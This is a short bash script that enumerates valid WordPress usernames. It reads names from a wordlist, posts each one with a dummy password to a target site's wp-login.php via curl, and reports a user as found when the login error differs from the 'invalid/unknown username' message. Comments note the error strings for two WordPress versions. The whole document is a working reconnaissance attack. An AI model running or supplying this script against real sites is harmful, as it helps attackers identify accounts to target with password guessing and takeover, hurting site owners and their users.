# Enumerates users using different message on wp-login for login in database

target=$1
userlist=$2
pattern=$3

# Wordpress 4.3.1 EN - Invalid username
# Wordpress 5.5.3 EN - Unknown username

for user in $(cat $userlist); do
   check=$(curl -ks "$target/wp-login.php" --data-raw "log=$user&pwd=aaa" |grep "id=\"login\_error" |grep -v "$pattern")
   [[ ! -z "$check" ]] && echo "User found: $user"
done
